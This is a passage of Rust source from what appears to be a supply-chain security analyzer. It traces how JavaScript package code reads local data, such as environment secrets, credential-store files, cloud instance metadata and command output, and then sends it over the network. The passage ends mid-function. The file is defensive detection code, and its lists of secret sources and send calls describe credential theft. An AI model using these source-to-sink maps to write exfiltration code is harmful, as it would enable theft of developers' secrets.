//! The supply-chain model of the JavaScript pass (phase 3 step 3 of the
//! Rust-first refactor, docs/RUST_ENGINE.md §8): local data — what a script
//! reads from the machine — followed on the parsed tree through bindings,
//! the script's own functions, callbacks, closures and members of `this` to
//! a network send. It answers what `flow::local_data_sent_at` answers on raw
//! text — the first send, the kind of data, what was read, whether only an
//! address held it — with names resolved by scope instead of followed by
//! name within a window of text: a quote in a regular expression, a name
//! that means two things in a bundle, or thousands of assignments of padding
//! change nothing. A text the parser doesn't read, or a reading past its
//! work budget, is the text follower's to answer.
//!
//! Sources and sends are the text follower's, read from the same tables of
//! the rule pack: an environment variable by its name (`_SH_IDENTITY_VAR_RE`,
//! `_SH_SECRET_VAR_RE`, `_LD_ENV_QUIET_RE`) and the whole environment; the
//! os module's names (`_LD_MODULE_NAMES`); a file outside the package
//! (`_LD_READERS`, `flow::ld_outside`); what a command prints
//! (`shell::sh_output_data`); the instance's metadata and the public IP
//! address a lookup service gives. Sends are the calls `_LD_SEND_RE` and its
//! siblings name, with the arguments they count as addresses, resolved by
//! scope (`require('https').request`, `const r = module.require; r('http')`),
//! and what a connection or a client made by the script writes.

use super::descs::{dedupe, D};
use super::driver::{fixpoint, Config, Out};
use crate::pystr;
use super::eval::{Eval, R};
use super::*;
use crate::flow::LiteralTest;
use crate::pack::Pack;
use std::sync::Arc;

// ---------------------------------------------------------------- the kinds --

pub const K_IDENTITY: u16 = 1 << 0;
pub const K_ENV: u16 = 1 << 1;
pub const K_WHOLE_ENV: u16 = 1 << 2;
pub const K_FILE: u16 = 1 << 3;
pub const K_REPORT: u16 = 1 << 4;
pub const K_CREDENTIALS: u16 = 1 << 5;
pub const K_ADDRESS: u16 = 1 << 6;
/// not local data: a path outside the package (a read of it is)
pub const K_PATH: u16 = 1 << 7;
/// a file of a credential store (`_CRED_STORE_RE`, not a public key's):
/// a file, kept apart so that a send of one is not hidden behind an
/// earlier read of another file
pub const K_CRED_FILE: u16 = 1 << 8;

/// The kinds' names (the text follower's strings), by bit index.
pub const KIND_NAMES: [&str; 9] =
    ["identity", "environment", "environment", "file", "report", "credentials", "address", "path", "file"];

/// The kinds that count even when only an address holds them (the text
/// follower's `_LD_NOT_IN_ADDRESS` are the others, the whole environment
/// excepted).
const STRONG_IN_ADDRESS: u16 = K_IDENTITY | K_WHOLE_ENV | K_FILE | K_CRED_FILE | K_REPORT;

/// What no client sends (import_time_risk's harvest): the instance's
/// credentials, the whole environment, a credential store. A send that
/// carries one is reported by it, whatever was read before it.
const HARVEST: u16 = K_CREDENTIALS | K_WHOLE_ENV | K_CRED_FILE;

/// Is a finding of this kind and what a harvest (signs.rs grades it so)?
fn harvest_of(p: &Pack, kind: &str, what: &[u32], whole: &[u32]) -> bool {
    match kind {
        "credentials" => true,
        "environment" => what == whole,
        "file" => cred_store(p, what),
        _ => false,
    }
}

/// Does a file read's `what` name a credential store?
fn cred_store(p: &Pack, what: &[u32]) -> bool {
    p.re("_CRED_STORE_RE").search(what).is_some() && p.re("_PUBLIC_KEY_FILE_RE").search(what).is_none()
}

/// The kind's bit for a kind name (the text follower's, and shell.rs's).
fn kind_bit(kind: &str, what: &[u32], whole: &[u32]) -> u16 {
    match kind {
        "identity" | "lookup-identity" => K_IDENTITY,
        "environment" if what == whole => K_WHOLE_ENV,
        "environment" => K_ENV,
        "file" => K_FILE,
        "report" => K_REPORT,
        "credentials" => K_CREDENTIALS,
        "address" => K_ADDRESS,
        _ => K_IDENTITY,
    }
}

fn bit_index(bit: u16) -> u8 {
    bit.trailing_zeros() as u8
}

// V.kind marks (bits 1 and 2 are project mode's request and response objects)

/// a connection, or a request being written: its write, end, send … send
pub const OBJ_CONN: u8 = 4;
/// an HTTP client the script made (axios.create(), got.extend()): its
/// calls and its post, put, patch, request send
pub const OBJ_CLIENT: u8 = 8;
/// process.env itself: a member of it is one variable
pub const OBJ_ENV: u8 = 16;
/// the marks a closure's variable keeps
pub const MARKS: u8 = OBJ_CONN | OBJ_CLIENT | OBJ_ENV;

/// The categories a parameter's reach is recorded under: what is sent, and
/// what only an address holds.
pub const SEND_DATA: u8 = 0;
pub const SEND_ADDR: u8 = 1;
/// (a parameter that is the command line an exec call runs: the script's
/// own wrapper of exec)
pub const EXEC_CMD: u8 = 2;
/// (a parameter that is the path a read reads: the script's own reader)
pub const READ_PATH: u8 = 3;
/// (a parameter that names the environment variable read: `getEnv(name)`)
pub const ENV_NAME: u8 = 4;

// ---------------------------------------------------------------- the model --

/// The supply-chain model of one text: the pack, the text (its spans are
/// what the text follower's tests read) and what is known before reading.
pub struct Supply {
    pub pack: Arc<Pack>,
    pub text: Vec<u32>,
    pub lit: LiteralTest,
    /// the names that hold a path outside the package (core's `outside`)
    pub outside: std::cell::RefCell<HashSet<PyStr>>,
    pub whole: PyStr,
}

use std::collections::HashSet;

impl Supply {
    pub fn new(pack: Arc<Pack>, text: &[u32]) -> Supply {
        let lit = LiteralTest::new(&pack, text);
        let whole = pack.text("_LD_WHOLE_ENV");
        Supply { pack, text: text.to_vec(), lit, outside: std::cell::RefCell::new(HashSet::new()), whole }
    }

    fn p(&self) -> &Pack {
        &self.pack
    }

    fn span(&self, lo: u32, hi: u32) -> &[u32] {
        let lo = (lo as usize).min(self.text.len());
        let hi = (hi as usize).min(self.text.len()).max(lo);
        &self.text[lo..hi]
    }
}

/// The send a call is: the arguments it counts as addresses (-1 all of
/// them, 0 none, n the first n), and whether only a name composed with a
/// literal counts (a DNS lookup).
#[derive(Clone, Copy, Debug)]
struct Spec {
    addresses: i8,
    composed: bool,
}

const SEND1: Spec = Spec { addresses: 1, composed: false };
const OPTIONS: Spec = Spec { addresses: 0, composed: false };
const REQUEST2: Spec = Spec { addresses: 2, composed: false };
const ADDRESS: Spec = Spec { addresses: -1, composed: false };
const LOOKUP: Spec = Spec { addresses: -1, composed: true };

/// The HTTP clients a name no declaration binds is taken for.
pub const CLIENT_GLOBALS: &[&str] = &["axios", "got", "needle", "superagent", "ky", "undici"];

const FETCH_MODULES: &[&str] = &[
    "node-fetch", "cross-fetch", "isomorphic-fetch", "isomorphic-unfetch", "make-fetch-happen", "minipass-fetch",
    "node-fetch-native", "ofetch",
];
const POSTERS: &[&str] = &["axios", "got", "needle", "superagent", "ky"];
const CONN_WRITES: &[&str] = &["write", "end", "send", "sendall", "sendto", "request"];
const CONN_CHAIN: &[&str] =
    &["on", "once", "addListener", "prependListener", "setHeader", "setTimeout", "setNoDelay", "setKeepAlive", "setEncoding"];
const EXEC_NAMES: &[&str] =
    &["execSync", "execFileSync", "spawnSync", "exec", "execFile", "execa", "execaSync", "execaCommand", "execaCommandSync"];
const FETCHERS: &[&str] = &["fetch", "axios.get", "http.get", "https.get", "got", "got.get"];

fn last_part(name: &[u32]) -> &[u32] {
    match name.iter().rposition(|&c| c == 0x2E) {
        Some(k) => &name[k + 1..],
        None => name,
    }
}

fn is_one(name: &[u32], set: &[&str]) -> bool {
    set.iter().any(|s| eq(name, s))
}

fn dotted2<'a>(a: &'a str, b: &'a [&'a str]) -> impl Fn(&[u32]) -> bool + 'a {
    move |name: &[u32]| b.iter().any(|m| eq(name, &format!("{}.{}", a, m)))
}

/// Is a literal's text a URL that its host continues past (`'https://'`,
/// `'http://x-'`): what is joined to it next is resolved as a host name?
pub(super) fn host_prefix(text: &[u32]) -> bool {
    let low: Vec<u32> = text.iter().map(|&c| if (0x41..=0x5A).contains(&c) { c + 32 } else { c }).collect();
    let rest = ["https://", "http://", "wss://", "ws://"].iter().find_map(|s| {
        let s: Vec<u32> = s.chars().map(|c| c as u32).collect();
        if low.len() >= s.len() && low[..s.len()] == s[..] {
            Some(&low[s.len()..])
        } else {
            None
        }
    });
    match rest {
        // (the host goes on into what is joined: nothing yet, a label not
        // ended, or one ended by '.' or '-'; `'http://x.com' + path` is a path)
        Some(r) => {
            r.len() <= 200
                && !r.iter().any(|&c| {
                    matches!(c, 0x2F | 0x3F | 0x23 | 0x22 | 0x27 | 0x60 | 0x3A) || char::from_u32(c).is_some_and(|ch| ch.is_whitespace())
                })
                && (r.is_empty() || matches!(r[r.len() - 1], 0x2E | 0x2D) || !r.contains(&0x2E))
        }
        None => false,
    }
}

/// Calls whose value is a number or a flag, not the data they are given.
const NUMERIC: &[&str] = &[
    "Buffer.byteLength", "byteLength", "parseInt", "parseFloat", "Number", "Boolean", "Math.floor", "Math.round",
    "Math.ceil", "Math.abs", "Math.trunc", "Math.min", "Math.max", "Date.now", "isNaN", "isFinite",
];

/// The send a callee's names make, if any.
fn send_spec(names: &[PyStr]) -> Option<Spec> {
    for n in names {
        let n = n.as_slice();
        if eq(n, "fetch") || is_one(n, FETCH_MODULES) || eq(n, "undici.fetch") || eq(n, "undici.request") {
            return Some(SEND1);
        }
        if eq(n, "navigator.sendBeacon") || eq(n, "sendBeacon") || eq(n, "Request") {
            return Some(SEND1);
        }
        for m in POSTERS {
            if dotted2(m, &["post", "put", "patch"])(n) {
                return Some(SEND1);
            }
        }
        if eq(n, "axios") || eq(n, "axios.request") {
            return Some(OPTIONS);
        }
        if is_one(n, &["http.get", "http.request", "https.get", "https.request", "axios.get", "got", "got.get"]) {
            return Some(ADDRESS);
        }
        if eq(n, "dns.lookup") || eq(n, "dns.promises.lookup") {
            return Some(LOOKUP);
        }
        let starts = |p: &str| n.len() >= p.len() && eq(&n[..p.len()], p);
        if starts("dns.resolve") || starts("dns.promises.resolve") {
            return Some(LOOKUP);
        }
    }
    None
}

/// Does a call of these names make a connection (its writes send)?
fn makes_connection(names: &[PyStr]) -> bool {
    names.iter().any(|n| {
        is_one(
            n,
            &[
                "http.request", "https.request", "http.get", "https.get", "http2.connect", "net.connect",
                "net.createConnection", "tls.connect", "dgram.createSocket",
            ],
        )
    })
}

/// Does a call of these names make a client (its calls send)?
fn makes_client(names: &[PyStr]) -> bool {
    names.iter().any(|n| {
        is_one(n, &["axios.create", "got.extend", "got.create", "ky.create", "ky.extend"])
    })
}

impl<'p> Eval<'p> {
    fn sup(&self) -> Rc<Supply> {
        self.p.cfg.supply.clone().expect("the supply-chain model")
    }

    /// A value read from the machine: `bit` with `what`, read at `at`.
    fn sc_source(&self, bit: u16, what: PyStr, at: u32, line: u32, mark: u8) -> V {
        let bit = if bit == K_FILE && cred_store(self.sup().p(), &what) { K_CRED_FILE } else { bit };
        let f = &self.p.fns[self.fid as usize];
        let fname = if f.is_module { None } else { f.name.clone().map(Rc::new) };
        let sc = Sc { kinds: bit, firsts: vec![(bit_index(bit), Rc::new(what), at)] };
        V::new(true, Some((self.m, line)), fname, None, V::empty().params, 0, false, mark).with_sc(Some(Rc::new(sc)))
    }

    /// One variable of the environment, by its name.
    fn sc_env_var(&self, name: &[u32], at: u32, line: u32) -> V {
        let sup = self.sup();
        let p = sup.p();
        if p.re("_SH_IDENTITY_VAR_RE").match_(name).is_some() {
            return self.sc_source(K_IDENTITY, name.to_vec(), at, line, 0);
        }
        if p.re("_SH_SECRET_VAR_RE").search(name).is_some() && p.re("_LD_ENV_QUIET_RE").match_(name).is_none() {
            return self.sc_source(K_ENV, name.to_vec(), at, line, 0);
        }
        if is_one(name, &["HOME", "USERPROFILE", "APPDATA", "LOCALAPPDATA", "INIT_CWD", "HOMEPATH"]) {
            return self.sc_source(K_PATH, name.to_vec(), at, line, 0);
        }
        V::empty()
    }

    /// A pattern's name given a value: one variable when the value is
    /// process.env itself and the path names it.
    pub(super) fn sc_pattern_value(&self, v: &V, path: &Path, ident: NodeId) -> Option<V> {
        if v.kind & OBJ_ENV == 0 || path.len() != 1 {
            return None;
        }
        let a = self.a();
        let (at, line) = (a.0.nodes[ident as usize].start, a.line(ident));
        Some(match &path[0] {
            Some(name) => self.sc_env_var(name, at, line),
            None => v.plain(),
        })
    }

    /// The names a callee resolves to: `os.hostname`, `https.request`,
    /// `axios.post` (a package's member), `fetch` (a global, also through
    /// globalThis, window, self or global).
    fn sc_names(&mut self, callee: NodeId, scope: ScopeId) -> Vec<PyStr> {
        let m = self.m;
        let mut out: Vec<PyStr> = Vec::new();
        let (member, obj, prop) = {
            let a = self.a();
            if a.kind(callee) == Kind::MemberExpression {
                (true, a.at(callee, jt::A), a.prop_name(callee))
            } else {
                (false, NONE, None)
            }
        };
        if member {
            if let Some(prop) = &prop {
                // a global's own member: self.fetch, global.fetch
                let global_obj = {
                    let a = self.a();
                    a.kind(obj) == Kind::Identifier
                        && ["globalThis", "window", "self", "global"].iter().any(|g| eq(a.name(obj), g))
                };
                if global_obj && self.bind(obj, scope).is_none() {
                    out.push(prop.clone());
                }
                for d in self.p.descs_of_expr(m, obj, scope, 0) {
                    if let D::Pkg(pk) = d {
                        let mut n = pk.clone();
                        n.push(0x2E);
                        n.extend_from_slice(prop);
                        out.push(n);
                    }
                }
            }
        }
        for d in self.p.descs_of_expr(m, callee, scope, 0) {
            match d {
                D::Builtin(b) => {
                    let mut n = b.clone();
                    for g in ["globalThis.", "window."] {
                        if n.len() > g.len() && eq(&n[..g.len()], g) {
                            n = n[g.len()..].to_vec();
                        }
                    }
                    out.push(n);
                }
                D::Global(g) => out.push(g),
                D::Pkg(pk) => out.push(pk),
                _ => {}
            }
        }
        dedupe(out)
    }

    /// The string a node is when it is constant: a string literal, a
    /// template without holes.
    fn sc_const_str(&self, node: NodeId) -> Option<PyStr> {
        let a = self.a();
        if let Some(v) = a.str_value(node) {
            return Some(v.to_vec());
        }
        if a.kind(node) == Kind::TemplateLiteral && a.list(node, jt::B).is_empty() {
            let q = a.list(node, jt::A);
            return Some(q.first().map(|&e| a.s(e, jt::A).to_vec()).unwrap_or_default());
        }
        None
    }

    /// The command line an exec call runs, when it is constant: its first
    /// argument (an argument list's items joined) and the string arguments
    /// after it.
    fn sc_command_line(&self, node: NodeId) -> Option<PyStr> {
        let a = self.a();
        let args = a.list(node, jt::B).to_vec();
        let first = *args.first()?;
        let mut argv: Vec<PyStr> = Vec::new();
        if a.kind(first) == Kind::ArrayExpression {
            for &e in a.list(first, jt::A) {
                if e != NONE {
                    if let Some(s) = self.sc_const_str(e) {
                        argv.push(s);
                    }
                }
            }
            if argv.is_empty() {
                return None;
            }
        } else {
            argv.push(self.sc_const_str(first)?);
        }
        for &e in args.iter().skip(1).take(8) {
            if a.kind(e) == Kind::ArrayExpression {
                for &x in a.list(e, jt::A) {
                    if x != NONE {
                        if let Some(s) = self.sc_const_str(x) {
                            argv.push(s);
                        }
                    }
                }
            } else if let Some(s) = self.sc_const_str(e) {
                argv.push(s);
            }
        }
        let parts: Vec<&[u32]> = argv.iter().map(|x| x.as_slice()).collect();
        Some(pystr::join(&u(" "), &parts))
    }

    /// Is a member's name one of the module table's (a cheap test first)?
    fn sc_reader_name(&self, name: &[u32]) -> bool {
        const NAMES: &[&str] = &["hostname", "userInfo", "homedir", "networkInterfaces", "getlogin", "uname"];
        is_one(name, NAMES)
    }

    /// The os module's names (and the user's or host's name under another
    /// module's): a read of local data, by the names a callee resolves to.
    fn sc_module_source(&self, names: &[PyStr], at: u32, line: u32) -> Option<V> {
        let sup = self.sup();
        let p = sup.p();
        for n in names {
            let n = n.as_slice();
            let k = match n.iter().position(|&c| c == 0x2E) {
                Some(k) => k,
                None => continue,
            };
            let (module, member) = (&n[..k], &n[k + 1..]);
            if let Some((_, kind)) = crate::flow::module_names(p, module).into_iter().find(|(name, _)| name.as_slice() == member) {
                let what = if eq(module, "os") && p.strs("_LD_OS_NAMED").iter().any(|x| x.as_slice() == member) {
                    member.to_vec()
                } else {
                    u("user or host name")
                };
                let v = self.sc_source(kind_bit(kind, &what, &sup.whole), what.clone(), at, line, 0);
                if eq(member, "homedir") {
                    // (and a path outside the package: a read under it is a file)
                    return Some(v.union(&self.sc_source(K_PATH, what, at, line, 0)));
                }
                return Some(v);
            }
        }
        None
    }

    /// A string literal: a path outside the package (a read of it is a
    /// file), else nothing.
    pub(super) fn sc_literal(&self, node: NodeId) -> V {
        let a = self.a();
        let value = match a.str_value(node) {
            Some(v) if !v.is_empty() => v,
            _ => return V::empty(),
        };
        let first = value[0];
        let drive = value.len() > 2 && (value[1] == 0x3A) && (value[2] == 0x5C || value[2] == 0x2F);
        if !(first == 0x2F || first == 0x7E || first == 0x24 || first == 0x25 || drive) {
            return V::empty();
        }
        let sup = self.sup();
        let n = &a.0.nodes[node as usize];
        // (a system folder, the home folder, a credential file; any absolute
        // path only where a read is given it whole: sc_source_call)
        let span = sup.span(n.start, n.end);
        if sup.p().re("_LD_FS_ROOT_RE").match_(span).is_none() && sup.p().re("_LD_CRED_FILE_RE").match_(span).is_none() {
            return V::empty();
        }
        self.sc_source(K_PATH, pystr::upto(value, 60).to_vec(), n.start, a.line(node), 0)
    }

    /// An identifier no declaration binds (an implicit global, or one the
    /// script assigns): a binding the model keeps for its name.
    pub(super) fn sc_global_bind(&mut self, ident: NodeId) -> BindId {
        let name = self.a().name(ident).to_vec();
        let m = self.m;
        let key = (3u8, m, name.clone());
        if let Some(&b) = self.p.sc_props.get(&key) {
            return b;
        }
        let bid = self.p.binds.len() as BindId;
        let fid = self.p.mods[m as usize].fn_;
        self.p.binds.push(Bind {
            bid,
            name,
            kind: BindKind::Var,
            fid,
            writes: Vec::new(),
            shared: true,
            module: m,
            refs: Vec::new(),
            targets: None,
        });
        self.p.sc_props.insert(key, bid);
        bid
    }

    /// A call that reads local data: its value, if it is one.
    fn sc_source_call(&mut self, node: NodeId, names: &[PyStr], args: &[V]) -> Option<V> {
        let sup = self.sup();
        let p = sup.p();
        let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
        if let Some(v) = self.sc_module_source(names, at, line) {
            return Some(v);
        }
        let last: PyStr = names.first().map(|n| last_part(n).to_vec()).unwrap_or_else(|| {
            let a = self.a();
            let callee = a.unwrap(a.at(node, jt::A));
            if a.is_ident(callee) {
                a.name(callee).to_vec()
            } else if a.kind(callee) == Kind::MemberExpression {
                a.prop_name(callee).unwrap_or_default()
            } else {
                Vec::new()
            }
        });
        // what a command prints
        if is_one(&last, EXEC_NAMES) {
            if let Some(line_text) = self.sc_command_line(node) {
                if let Some((kind, what)) = crate::shell::sh_output_data(p, &line_text, 0, None).into_iter().next() {
                    return Some(self.sc_source(kind_bit(kind, &what, &sup.whole), what, at, line, 0));
                }
            }
            return None;
        }
        // a file outside the package
        let readers = p.strs("_LD_READERS");
        if readers.iter().any(|r| r.as_slice() == last.as_slice()) && !p.strs("_LD_NOT_READS").iter().any(|r| r.as_slice() == last.as_slice()) {
            let a = self.a();
            if let Some(&first) = a.list(node, jt::B).first() {
                let (lo, hi) = (a.0.nodes[first as usize].start, a.0.nodes[first as usize].end);
                let outside = crate::flow::ld_outside(p, &sup.text, lo as usize, hi as usize, true, &sup.outside.borrow(), &sup.lit);
                if outside {
                    let arg = sup.span(lo, hi);
                    let what = match p.re("_LD_PLAIN_LITERAL_RE").match_(arg) {
                        Some(pl) => pl.group(2).unwrap_or(&[]).to_vec(),
                        None => arg.to_vec(),
                    };
                    return Some(self.sc_source(K_FILE, pystr::upto(&what, 60).to_vec(), at, line, 0));
                }
                // (a path outside the package given it: a parameter, a name)
                if let Some(sc) = args.first().and_then(|v| v.sc.clone()) {
                    if let Some((_, what, _)) = sc.firsts.iter().find(|(k, _, _)| (1u16 << k) == K_PATH) {
                        return Some(self.sc_source(K_FILE, pystr::upto(what, 60).to_vec(), at, line, 0));
                    }
                }
                // (a parameter: the script's own reader, for its callers)
                if let Some(v) = args.first() {
                    if !v.params.is_empty() {
                        let label = Rc::new(self.p.fns[self.fid as usize].label());
                        let entry: Entry = (self.m, at, label, false);
                        for &key in v.params.iter() {
                            self.reach_adds.push((key, READ_PATH, entry.clone()));
                        }
                    }
                }
            }
            return None;
        }
        // the instance's metadata, the machine's public IP address
        if names.iter().any(|n| is_one(n, FETCHERS) || is_one(n, FETCH_MODULES)) {
            let a = self.a();
            let args = a.list(node, jt::B);
            if let (Some(&f), Some(&l)) = (args.first(), args.last()) {
                let text = sup.span(a.0.nodes[f as usize].start, a.0.nodes[l as usize].end);
                if p.re("_LD_METADATA_RE").search(text).is_some() {
                    return Some(self.sc_source(K_CREDENTIALS, u("the instance's metadata"), at, line, 0));
                }
                if p.re("_LD_PUBLIC_IP_RE").search(text).is_some() {
                    return Some(self.sc_source(K_ADDRESS, u("the machine's public IP address"), at, line, 0));
                }
            }
        }
        None
    }

    /// Is an argument a name composed with a literal (`h + '.x.com'`,
    /// a template with text), or a name given one?
    fn sc_composed(&self, node: NodeId, scope: ScopeId, depth: u32) -> bool {
        let a = self.a();
        match a.kind(node) {
            Kind::TemplateLiteral => {
                !a.list(node, jt::B).is_empty() && a.list(node, jt::A).iter().any(|&q| !a.s(q, jt::A).is_empty())
            }
            Kind::BinaryExpression if a.operator(node) == "+" => {
                let mut n = node;
                let mut seen = 0;
                loop {
                    if a.is_string(a.at(n, jt::B)) {
                        return true;
                    }
                    let left = a.at(n, jt::A);
                    if a.is_string(left) {
                        return true;
                    }
                    if a.kind(left) == Kind::BinaryExpression && a.operator(left) == "+" && seen < ALIAS_DEPTH {
                        n = left;
                        seen += 1;
                        continue;
                    }
                    return false;
                }
            }
            Kind::CallExpression => {
                // 'x'.concat(…), [a, b].join('.')
                let callee = a.unwrap(a.at(node, jt::A));
                a.kind(callee) == Kind::MemberExpression
                    && a.prop_name(callee).is_some_and(|n| eq(&n, "concat") || eq(&n, "join"))
            }
            Kind::Identifier if depth < 2 => {
                let b = match self.bind(node, scope) {
                    Some(b) => b,
                    None => return false,
                };
                let writes = self.p.binds[b as usize].writes.clone();
                writes.iter().any(|w| match w {
                    Write::Init { node, scope, path } | Write::Assign { node, scope, path } if path.is_empty() => {
                        self.p.binds[b as usize].module == self.m && self.sc_composed(*node, *scope, depth + 1)
                    }
                    _ => false,
                })
            }
            _ => false,
        }
    }

    /// A send: what reaches its arguments, by role.
    fn sc_send(&mut self, node: NodeId, spec: Spec, args: &[V], spread: isize, scope: ScopeId) {
        let at = self.a().0.nodes[node as usize].start;
        let arg_nodes = self.a().list(node, jt::B).to_vec();
        let label = Rc::new(self.p.fns[self.fid as usize].label());
        for (i, v) in args.iter().enumerate() {
            let address = spec.addresses < 0 || (spec.addresses > 0 && (i as i8) < spec.addresses);
            if spec.composed {
                match arg_nodes.get(i) {
                    Some(&n) if self.sc_composed(n, scope, 0) => {}
                    _ => continue,
                }
            }
            let v = if spread >= 0 && i as isize >= spread { union_all(args.iter().skip(i)) } else { v.clone() };
            self.sc_reach(&v, if address { SEND_ADDR } else { SEND_DATA }, at, &label);
            if spread >= 0 && i as isize >= spread {
                break;
            }
        }
    }

    /// A value at a send's argument: the parameters it holds reach the send
    /// (the function's summary); local data in it is the finding.
    pub(super) fn sc_reach(&mut self, v: &V, cat: u8, at: u32, label: &Rc<PyStr>) {
        if !v.tainted() {
            return;
        }
        let entry: Entry = (self.m, at, label.clone(), false);
        for &key in v.params.iter() {
            self.reach_adds.push((key, cat, entry.clone()));
        }
        if v.src && self.emit {
            if let Some(sc) = &v.sc {
                self.sc_emit(sc, cat == SEND_ADDR, at);
            }
        }
    }

    /// A URL literal whose host the next part continues, joined with `v`:
    /// what is resolved in a host name is sent (the text follower's
    /// `_LD_HOST_BUILT_RE`).
    pub(super) fn sc_host_built(&mut self, lit: NodeId, v: &V) {
        if !v.tainted() {
            return;
        }
        let (prefix, at) = {
            let a = self.a();
            let text = match a.kind(lit) {
                Kind::Literal => a.str_value(lit).map(|s| s.to_vec()),
                Kind::TemplateLiteral => a.list(lit, jt::A).first().map(|&q| a.s(q, jt::A).to_vec()),
                _ => None,
            };
            (text.is_some_and(|t| host_prefix(&t)), a.0.nodes[lit as usize].start)
        };
        if prefix {
            let label = Rc::new(self.p.fns[self.fid as usize].label());
            self.sc_reach(v, SEND_DATA, at, &label);
        }
    }

    /// A call of the script's wrapper of exec (its parameter `i` is the
    /// command line): what the command prints, when the call gives it as a
    /// constant.
    pub(super) fn sc_wrapper_output(&self, node: NodeId, i: usize) -> Option<V> {
        let (arg, at, line) = {
            let a = self.a();
            let args = a.list(node, jt::B);
            let arg = *args.get(i)?;
            if args.iter().take(i + 1).any(|&x| a.kind(x) == Kind::SpreadElement) {
                return None;
            }
            (arg, a.0.nodes[node as usize].start, self.call_line(node))
        };
        let command = self.sc_const_str(arg)?;
        let sup = self.sup();
        let p = sup.p();
        if p.re("_LD_METADATA_RE").search(&command).is_some() {
            return Some(self.sc_source(K_CREDENTIALS, u("the instance's metadata"), at, line, 0));
        }
        let (kind, what) = crate::shell::sh_output_data(p, &command, 0, None).into_iter().next()?;
        Some(self.sc_source(kind_bit(kind, &what, &sup.whole), what, at, line, 0))
    }

    /// A call of the script's own reader (its parameter `i` is the path),
    /// given a path outside the package: what it reads; of the script's own
    /// `getEnv(name)`, given a constant name: that variable.
    pub(super) fn sc_wrapper_read(&self, node: NodeId, cat: u8, t: &V, i: usize) -> Option<V> {
        let (at, line) = (self.a().0.nodes[node as usize].start, self.call_line(node));
        if cat == READ_PATH {
            let sc = t.sc.as_ref()?;
            let (_, what, _) = sc.firsts.iter().find(|(k, _, _)| (1u16 << k) == K_PATH)?;
            return Some(self.sc_source(K_FILE, pystr::upto(what, 60).to_vec(), at, line, 0));
        }
        if cat == ENV_NAME {
            let arg = {
                let a = self.a();
                let args = a.list(node, jt::B);
                if args.iter().take(i + 1).any(|&x| a.kind(x) == Kind::SpreadElement) {
                    return None;
                }
                *args.get(i)?
            };
            let name = self.sc_const_str(arg)?;
            let v = self.sc_env_var(&name, at, line);
            return if v.tainted() { Some(v) } else { None };
        }
        None
    }

    /// The finding for local data `sc` at a send.
    pub(super) fn sc_emit(&mut self, sc: &Sc, address: bool, at: u32) {
        // (a harvest first, then the first read)
        let pick = |strong_only: bool| {
            sc.firsts
                .iter()
                .filter(|(k, _, _)| (1u16 << k) != K_PATH)
                .filter(|(k, _, _)| !strong_only || (1u16 << k) & STRONG_IN_ADDRESS != 0)
                .min_by_key(|(k, _, a)| ((1u16 << k) & HARVEST == 0, *a))
                .cloned()
        };
        let (chosen, in_address) = if !address {
            (pick(false), false)
        } else {
            match pick(true) {
                Some(c) => (Some(c), false),
                None => (pick(false), true),
            }
        };
        if let Some((k, what, _)) = chosen {
            self.findings.push(Out::Send { at, kind: KIND_NAMES[k as usize], what: (*what).clone(), in_address });
        }
    }

    /// The functions a call's arguments are (a callback, a function's name).
    fn sc_fn_args(&mut self, node: NodeId, scope: ScopeId) -> Vec<FnId> {
        let m = self.m;
        let arg_nodes = self.a().list(node, jt::B).to_vec();
        let mut out = Vec::new();
        for an in arg_nodes {
            let k = self.a().kind(an);
            if self.a().is_function(an) {
                out.push(self.p.mods[m as usize].fid_at[an as usize]);
            } else if matches!(k, Kind::Identifier | Kind::MemberExpression) {
                for d in self.p.descs_of_expr(m, an, scope, 0) {
                    if let D::Fn(f) = d {
                        out.push(f);
                    }
                }
            }
        }
        dedupe(out)
    }

    /// Callbacks given a value: each parameter holds it (a read's callback
    /// gets what was read; a callback of anything else, what the call
    /// holds: its receiver and its other arguments). Their value.
    fn sc_callbacks(&mut self, node: NodeId, val: &V, scope: ScopeId) -> V {
        if !val.tainted() {
            return V::empty();
        }
        let fids = self.sc_fn_args(node, scope);
        if fids.is_empty() {
            return V::empty();
        }
        let line = self.call_line(node);
        let mut out = V::empty();
        for fid in fids {
            let n = self.p.fns[fid as usize].params.len().max(1);
            let cb_args = vec![val.plain(); n];
            out = out.union(&self.apply(node, &[fid], &cb_args, -1, line, false));
        }
        out
    }

    /// `this.x` in a method of a class or an object literal: the binding
    /// the model keeps for that member (made when first met), or None.
    pub(super) fn sc_this_member(&mut self, member: NodeId, scope: ScopeId) -> Option<BindId> {
        let (obj, name) = {
            let a = self.a();
            if a.kind(member) != Kind::MemberExpression || a.computed(member) {
                return None;
            }
            (a.at(member, jt::A), a.prop_name(member)?)
        };
        if self.a().kind(obj) != Kind::ThisExpression {
            return None;
        }
        let owner = self.p.this_descs(scope).into_iter().find_map(|d| match d {
            D::Inst(c) => Some((1u8, c)),
            D::Obj(o) => Some((2u8, o)),
            _ => None,
        })?;
        let key = (owner.0, owner.1, name.clone());
        if let Some(&b) = self.p.sc_props.get(&key) {
            return Some(b);
        }
        let m = self.m;
        let bid = self.p.binds.len() as BindId;
        let fid = self.p.mods[m as usize].fn_;
        self.p.binds.push(Bind {
            bid,
            name,
            kind: BindKind::Var,
            fid,
            writes: Vec::new(),
            shared: true,
            module: m,
            refs: Vec::new(),
            targets: None,
        });
        self.p.sc_props.insert(key, bid);
        Some(bid)
    }

    /// supply mode: a member's value, or None for the default reading.
    /// `key`: a computed member's key, its value.
    pub(super) fn sc_member(&mut self, node: NodeId, obj: &V, key: &V, scope: ScopeId) -> Option<V> {
        let (computed, name, objn, at, line) = {
            let a = self.a();
            let computed = a.computed(node);
            let line = if computed { a.line(node) } else { a.line(a.at(node, jt::B)) };
            (computed, a.prop_name(node), a.at(node, jt::A), a.0.nodes[node as usize].start, line)
        };
        // process.env
        if name.as_deref().is_some_and(|n| eq(n, "env")) && self.a().is_ident_named(objn, "process") && self.bind(objn, scope).is_none() {
            let whole = self.sup().whole.clone();
            return Some(self.sc_source(K_WHOLE_ENV, whole, at, line, OBJ_ENV));
        }
        // one of its variables; by a name it computes: every variable when
        // the name comes from the environment itself (a copy of it), the
        // variable a caller names (`getEnv(name)`), else none
        if obj.kind & OBJ_ENV != 0 {
            return Some(match name {
                Some(n) => self.sc_env_var(&n, at, line),
                None => {
                    if key.sc.as_ref().is_some_and(|s| s.kinds & K_WHOLE_ENV != 0) {
                        obj.plain()
                    } else {
                        if !key.params.is_empty() {
                            let label = Rc::new(self.p.fns[self.fid as usize].label());
                            let entry: Entry = (self.m, at, label, false);
                            for &k in key.params.iter() {
